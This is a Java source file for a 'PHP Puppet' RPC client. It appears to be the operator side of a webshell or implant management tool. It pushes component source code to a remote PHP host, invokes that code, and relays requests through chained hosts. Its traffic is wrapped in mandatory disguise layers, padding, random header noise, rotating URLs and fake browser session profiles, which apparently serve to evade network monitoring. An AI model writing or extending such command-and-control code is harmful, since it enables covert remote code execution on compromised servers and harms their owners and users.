package org.leo.phpcore.rpc;

import org.leo.core.component.runtime.ComponentArtifact;
import org.leo.core.entity.Puppet;
import org.leo.core.net.Communication;
import org.leo.core.net.impl.HttpCommunication;
import org.leo.core.net.layer.HeaderNoiseGenerator;
import org.leo.core.net.layer.HeaderNoiseStrategy;
import org.leo.core.net.layer.HttpSessionProfile;
import org.leo.core.net.layer.PaddingStrategy;
import org.leo.core.net.layer.PaddingUtil;
import org.leo.core.net.layer.RequestLayer;
import org.leo.core.net.layer.ResponseLayer;
import org.leo.core.net.layer.UrlGenerator;
import org.leo.core.net.layer.UrlStrategy;
import org.leo.core.rpc.PuppetOperation;
import org.leo.core.rpc.PuppetRpcEnvelopeMapper;
import org.leo.core.rpc.PuppetRpcRequest;
import org.leo.core.rpc.PuppetRpcResponse;
import org.leo.phpcore.payload.PhpPayloadCodec;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.function.Function;

import static org.leo.core.rpc.PuppetRpcErrorCodes.isHostIdMismatch;

/** Platform-side client for the PHP core execution Envelope. */
public final class PhpRpcClient implements AutoCloseable {
    private static final int MIN_HOST_AFFINITY_ATTEMPTS = 8;

    private final Communication communication;
    private final List<RequestLayer> requestLayers;
    private final List<ResponseLayer> responseLayers;
    private final PhpPayloadCodec payloadCodec;
    private final Map<String, PhpPayloadCodec> layerPayloadCodecs = new ConcurrentHashMap<>();
    private volatile String hostId;
    /** 最大请求总数，包含首次请求。 */
    private int maxAttempts = Puppet.DEFAULT_MAX_REQUEST_COUNT;
    private UrlGenerator urlGenerator;
    private UrlStrategy urlStrategy;
    private PaddingStrategy paddingStrategy;
    private HeaderNoiseGenerator headerNoiseGenerator;
    private HeaderNoiseStrategy headerNoiseStrategy;
    private long retryBaseDelayMillis = 150L;
    private long retryMaxDelayMillis = 2_000L;
    private RetrySleeper retrySleeper = Thread::sleep;
    private Function<String, Map<String, Object>> hostIdMismatchRecovery;

    public PhpRpcClient(Communication communication,
                        List<RequestLayer> requestLayers,
                        List<ResponseLayer> responseLayers,
                        String payloadKey) {
        this.communication = communication;
        this.requestLayers = requestLayers == null ? List.of() : new ArrayList<>(requestLayers);
        this.responseLayers = responseLayers == null ? List.of() : new ArrayList<>(responseLayers);
        this.payloadCodec = new PhpPayloadCodec(payloadKey);
    }

    public void setHostId(String hostId) {
        this.hostId = hostId;
        rebuildTransportGenerators();
    }

    public void setMaxReqCount(Integer count) {
        this.maxAttempts = Puppet.requireValidMaxRequestCount(count);
    }

    public void setUrlStrategy(UrlStrategy strategy) {
        this.urlStrategy = strategy;
        rebuildTransportGenerators();
    }

    public void setPaddingStrategy(PaddingStrategy strategy) { this.paddingStrategy = strategy; }

    public void setHeaderNoiseStrategy(HeaderNoiseStrategy strategy) {
        this.headerNoiseStrategy = strategy;
        rebuildTransportGenerators();
    }

    public void setRetryBackoff(long baseDelayMillis, long maxDelayMillis) {
        this.retryBaseDelayMillis = Math.max(0L, baseDelayMillis);
        this.retryMaxDelayMillis = Math.max(this.retryBaseDelayMillis, maxDelayMillis);
    }

    void setRetrySleeper(RetrySleeper retrySleeper) {
        this.retrySleeper = retrySleeper == null ? Thread::sleep : retrySleeper;
    }

    public void setHostIdMismatchRecovery(
            Function<String, Map<String, Object>> hostIdMismatchRecovery) {
        this.hostIdMismatchRecovery = hostIdMismatchRecovery;
    }

    public Map<String, Object> ping() throws Exception {
        return call(request(PuppetOperation.PING, null, null, Map.of()));
    }

    public Map<String, Object> invokeComponent(String componentId, String digest,
                                                Map<String, Object> params) throws Exception {
        Map<String, Object> request = params == null
                ? new LinkedHashMap<>() : new LinkedHashMap<>(params);
        request.put("componentKey", componentKey(componentId, digest));
        Object action = request.remove("action");
        return call(request(PuppetOperation.COMPONENT_INVOKE, componentId,
                action == null ? null : String.valueOf(action), request));
    }

    public Map<String, Object> putComponent(ComponentArtifact artifact) throws Exception {
        if (artifact == null) throw new IllegalArgumentException("artifact不能为空");
        Map<String, Object> request = new LinkedHashMap<>();
        request.put("componentKey", componentKey(artifact.getComponentId(), artifact.getDigest()));
        request.put("source", new String(artifact.getContent(), StandardCharsets.UTF_8));
        return call(request(PuppetOperation.COMPONENT_LOAD,
                artifact.getComponentId(), null, request));
    }

    private PuppetRpcRequest request(PuppetOperation operation, String component,
                                     String action, Map<String, Object> params) {
        return new PuppetRpcRequest(UUID.randomUUID().toString(), operation,
                hostId, component, action, params);
    }

    private String componentKey(String componentId, String digest) {
        if (componentId == null || componentId.isBlank()) {
            throw new IllegalArgumentException("componentId不能为空");
        }
        if (digest == null || !digest.matches("[a-f0-9]{64}")) {
            throw new IllegalArgumentException("digest格式错误");
        }
        try {
            byte[] value = MessageDigest.getInstance("SHA-256")
                    .digest(componentId.getBytes(StandardCharsets.UTF_8));
            StringBuilder slot = new StringBuilder(16);
            for (int index = 0; index < 8; index++) slot.append(String.format("%02x", value[index] & 0xff));
            return slot + digest;
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException(e);
        }
    }

    private Map<String, Object> call(PuppetRpcRequest request) throws Exception {
        Exception lastFailure = null;
        PuppetRpcResponse hostMismatchResponse = null;
        int affinityAttempts = request.hostId() == null
                ? maxAttempts : Math.max(maxAttempts, MIN_HOST_AFFINITY_ATTEMPTS);
        for (int attempt = 1; attempt <= affinityAttempts; attempt++) {
            try {
                applyTransportStrategies();
                EncodedPayload encoded = encode(request);
                Map<String, Object> decoded = decode(
                        communication.sendRequest(encoded.data()), encoded.requestIds());
                PuppetRpcResponse response = PuppetRpcEnvelopeMapper.responseFromMap(decoded);
                if (isHostIdMismatch(response)) {
                    hostMismatchResponse = response;
                    if (attempt < affinityAttempts) {
                        resetTransportAffinity();
                        continue;
                    }
                    return recoverHostAffinity(request.hostId(), response);
                }
                return PuppetRpcEnvelopeMapper.toResultMap(response);
            } catch (Exception e) {
                lastFailure = e;
                if (attempt >= maxAttempts) break;
                sleepBeforeRetry(request.requestId(), attempt);
            }
        }
        if (hostMismatchResponse != null) {
            return recoverHostAffinity(request.hostId(), hostMismatchResponse);
        }
        throw new IllegalStateException("PHP Puppet 通信失败: "
                + (lastFailure != null ? lastFailure.getMessage() : "unknown"), lastFailure);
    }

    public void resetTransportAffinity() {
        if (communication instanceof HttpCommunication http) http.resetSessionAffinity();
    }

    private Map<String, Object> recoverHostAffinity(
            String expectedHostId, PuppetRpcResponse mismatchResponse) {
        Function<String, Map<String, Object>> recovery = hostIdMismatchRecovery;
        if (recovery == null) return PuppetRpcEnvelopeMapper.toResultMap(mismatchResponse);
        try {
            Map<String, Object> recovered = recovery.apply(expectedHostId);
            return recovered != null ? recovered : PuppetRpcEnvelopeMapper.toResultMap(mismatchResponse);
        } catch (RuntimeException e) {
            Map<String, Object> result = new LinkedHashMap<>();
            result.put("code", Integer.valueOf(503));
            result.put("errorCode", org.leo.core.rpc.PuppetRpcErrorCodes.HOST_ID_UNAVAILABLE);
            result.put("msg", "目标实例重新握手失败: "
                    + (e.getMessage() == null ? e.getClass().getSimpleName() : e.getMessage()));
            return result;
        }
    }

    private EncodedPayload encode(PuppetRpcRequest request) throws Exception {
        if (requestLayers.isEmpty()) {
            throw new IllegalStateException("requestLayers为空，PHP Puppet 必须配置请求伪装");
        }
        List<String> requestIds = new ArrayList<>();
        requestIds.add(request.requestId());
        Map<String, Object> wireRequest = PuppetRpcEnvelopeMapper.toMap(request);
        PaddingUtil.pad(wireRequest, paddingStrategy, estimateBytes(wireRequest),
                request.requestId() + "|0|" + transportSeed());
        byte[] current = encodeLayer(wireRequest, requestLayers.get(0));
        for (int i = 1; i < requestLayers.size(); i++) {
            RequestLayer previous = requestLayers.get(i - 1);
            Map<String, Object> relayParams = new LinkedHashMap<>();
            relayParams.put("url", previous.getUrl());
            relayParams.put("headers", previous.getRelayHeaders());
            relayParams.put("body", current);
            PuppetRpcRequest relay = request(PuppetOperation.RELAY, null, null, relayParams);
            Map<String, Object> relayWire = PuppetRpcEnvelopeMapper.toMap(relay);
            PaddingUtil.pad(relayWire, paddingStrategy, estimateBytes(relayWire),
                    relay.requestId() + "|" + i + "|" + transportSeed());
            current = encodeLayer(relayWire, requestLayers.get(i));
            requestIds.add(relay.requestId());
        }
        return new EncodedPayload(current, requestIds);
    }

    private Map<String, Object> decode(byte[] response, List<String> requestIds) throws Exception {
        if (responseLayers.isEmpty()) {
            throw new IllegalStateException("responseLayers为空，PHP Puppet 必须配置响应伪装");
        }
        if (responseLayers.size() != requestIds.size()) {
            throw new IllegalStateException("请求层与响应层数量不一致");
        }
        byte[] current = response;
        Map<String, Object> decoded = null;
        for (int i = 0; i < responseLayers.size(); i++) {
            decoded = payloadCodec(responseLayers.get(i).getPayloadKey())
                    .decode(responseLayers.get(i).getDisguise().decodeTraffic(current));
            String expectedRequestId = requestIds.get(requestIds.size() - 1 - i);
            if (!PuppetRpcEnvelopeMapper.isEnvelopeResponse(decoded, expectedRequestId)) {
                throw new IllegalStateException("PHP Puppet 响应 requestId 不匹配");
            }
            if (i < responseLayers.size() - 1) {
                PuppetRpcResponse relayResponse = PuppetRpcEnvelopeMapper.responseFromMap(decoded);
                Object nested = relayResponse.data() instanceof Map<?, ?> data ? data.get("body") : null;
                if (!relayResponse.isSuccess() || !(nested instanceof byte[] bytes)) {
                    throw new IllegalStateException("PHP Puppet Relay 响应缺少 data.body");
                }
                current = bytes;
            }
        }
        if (decoded == null || decoded.isEmpty()) {
            throw new IllegalStateException("PHP Puppet 响应为空");
        }
        return decoded;
    }

    private byte[] encodeLayer(Map<String, Object> payload, RequestLayer layer)
            throws Exception {
        if (layer == null || layer.getDisguise() == null || !layer.getDisguise().isTrafficOnly()) {
            throw new IllegalStateException("PHP 伪装必须配置 traffic 编解码");
        }
        return layer.getDisguise().encodeTraffic(
                payloadCodec(layer.getPayloadKey()).encode(payload));
    }

    private PhpPayloadCodec payloadCodec(String layerPayloadKey) {
        if (layerPayloadKey == null || layerPayloadKey.trim().isEmpty()) {
            return payloadCodec;
        }
        return layerPayloadCodecs.computeIfAbsent(layerPayloadKey.trim(), PhpPayloadCodec::new);
    }

    private record EncodedPayload(byte[] data, List<String> requestIds) { }

    private void applyTransportStrategies() {
        if (!(communication instanceof HttpCommunication http) || requestLayers.isEmpty()) return;
        RequestLayer outermost = requestLayers.get(requestLayers.size() - 1);
        outermost.getMergedHeaders().forEach(http::addHeader);
        http.setRequestProfileHeaders(HttpSessionProfile.headers(transportSeed(), http.getUrl()));
        if (urlGenerator != null) http.setRequestUrl(urlGenerator.nextUrl(http.getMethod()));
        if (headerNoiseGenerator != null) http.setRequestNoiseHeaders(headerNoiseGenerator.generate());
    }

    private void rebuildTransportGenerators() {
        if (communication instanceof HttpCommunication http) {
            this.urlGenerator = urlStrategy != null && urlStrategy.isEnabled()
                    ? new UrlGenerator(urlStrategy, http.getUrl(), transportSeed()) : null;
        } else {
            this.urlGenerator = null;
        }
        this.headerNoiseGenerator = headerNoiseStrategy != null && headerNoiseStrategy.isEnabled()
                ? new HeaderNoiseGenerator(headerNoiseStrategy, transportSeed()) : null;
    }

    private String transportSeed() {
        String endpoint = communication instanceof HttpCommunication http ? http.getUrl() : "php";
        return (hostId == null || hostId.isBlank() ? "bootstrap" : hostId) + "|" + endpoint;
    }

    private int estimateBytes(Object value) {
        if (value == null) return 4;
        if (value instanceof byte[] bytes) return bytes.length + 8;
        if (value instanceof CharSequence text) {
            return text.toString().getBytes(StandardCharsets.UTF_8).length + 4;
        }
        if (value instanceof Map<?, ?> map) {
            int total = 2;
            for (Map.Entry<?, ?> entry : map.entrySet()) {
                total += estimateBytes(String.valueOf(entry.getKey()))
                        + estimateBytes(entry.getValue()) + 2;
            }
            return total;
        }
        if (value instanceof Iterable<?> iterable) {
            int total = 2;
            for (Object item : iterable) total += estimateBytes(item) + 1;
            return total;
        }
        return String.valueOf(value).getBytes(StandardCharsets.UTF_8).length + 2;
    }

    private void sleepBeforeRetry(String requestId, int attempt) {
        if (retryBaseDelayMillis <= 0L) return;
        int shift = Math.min(20, Math.max(0, attempt - 1));
        long exponential = retryBaseDelayMillis > Long.MAX_VALUE >> shift
                ? Long.MAX_VALUE : retryBaseDelayMillis << shift;
        long capped = Math.min(retryMaxDelayMillis, exponential);
        long hash = retryHash(requestId + "|" + attempt);
        double factor = 0.75d + (Math.floorMod(hash, 501L) / 1000.0d);
        long delay = Math.max(1L, Math.min(retryMaxDelayMillis, Math.round(capped * factor)));
        try {
            retrySleeper.sleep(delay);
        } catch (InterruptedException interrupted) {
            Thread.currentThread().interrupt();
            throw new IllegalStateException("PHP Puppet 重试等待被中断", interrupted);
        }
    }

    private long retryHash(String value) {
        try {
            byte[] digest = MessageDigest.getInstance("SHA-256")
                    .digest(value.getBytes(StandardCharsets.UTF_8));
            long result = 0L;
            for (int index = 0; index < Long.BYTES; index++) {
                result = (result << 8) | (digest[index] & 0xffL);
            }
            return result;
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException(e);
        }
    }

    @FunctionalInterface
    interface RetrySleeper {
        void sleep(long millis) throws InterruptedException;
    }

    @Override
    public void close() throws Exception {
        if (communication instanceof AutoCloseable closeable) closeable.close();
    }
}
